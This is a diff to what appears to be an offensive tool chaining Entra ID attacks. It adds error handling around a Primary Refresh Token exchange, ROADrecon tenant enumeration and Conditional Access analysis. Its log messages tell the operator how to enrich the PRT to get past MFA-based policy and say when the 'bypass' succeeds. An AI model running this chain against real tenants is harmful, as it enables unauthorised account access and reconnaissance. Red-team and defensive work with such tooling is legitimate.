@@ -584,7 +584,23 @@ def phase_5_prt_exchange(state: ChainState, log: Logger, dry_run: bool) -> bool:
 
         return True
     else:
-        log.error("PRT exchange failed")
+        m = re.search(r"(AADSTS\d+)", combined)
+        code = m.group(1) if m else ""
+        if code == "AADSTS50076" or "interaction_required" in combined.lower():
+            log.error("PRT exchange blocked by Conditional Access — the resource "
+                      "requires MFA and this PRT carries no MFA claim.")
+            log.warning(
+                "The PRT was minted from username+password (Phase 4), so it "
+                "carries amr:[pwd,rsa] but not mfa. To satisfy an MFA-strength "
+                "CA policy, enrich the PRT interactively — "
+                f"`roadtx prtenrich -f {state.prt_file}` — then re-run from "
+                "phase 5. This block is the CA policy working as intended: the "
+                "bypass only completes where the device-code / PRT grant is "
+                "NOT covered by MFA.")
+        elif code:
+            log.error(f"PRT exchange failed: {code}")
+        else:
+            log.error("PRT exchange failed")
         return False
 
 
@@ -592,6 +608,18 @@ def phase_6_enumerate(state: ChainState, log: Logger, dry_run: bool) -> bool:
     """Full tenant enumeration via ROADrecon."""
     log.phase(6, PHASE_NAMES[6])
     log.info("Running full tenant enumeration with device-authenticated token")
+
+    # Phase 5 must have produced the device-authenticated token; without it
+    # `roadrecon gather` just raises FileNotFoundError. Under --force the run
+    # reaches here even when Phase 5 was CA-blocked, so skip cleanly instead
+    # of dumping a traceback.
+    if not dry_run and not (state.work_dir / state.device_token_file).exists():
+        log.warning(
+            f"Skipping enumeration — {state.device_token_file} not found "
+            "(Phase 5 produced no device token; it was likely CA-blocked). "
+            f"Enrich the PRT (roadtx prtenrich -f {state.prt_file}) and re-run "
+            "from phase 5.")
+        return False
 
     rc, stdout, stderr = run_cmd([
         "roadrecon", "gather",
@@ -630,6 +658,14 @@ def phase_7_policy_analysis(state: ChainState, log: Logger, dry_run: bool) -> bo
     """Analyze Conditional Access policies from ROADrecon database."""
     log.phase(7, PHASE_NAMES[7])
     log.info("Analyzing Conditional Access policies")
+
+    # Needs the ROADrecon DB from Phase 6; skip cleanly if it's absent rather
+    # than letting roadrecon raise "The database file ... was not found".
+    if not dry_run and not (state.work_dir / state.roadrecon_db).exists():
+        log.warning(
+            f"Skipping CA policy analysis — {state.roadrecon_db} not found "
+            "(Phase 6 did not complete).")
+        return False
 
     rc, stdout, stderr = run_cmd([
         "roadrecon", "plugin", "policies",
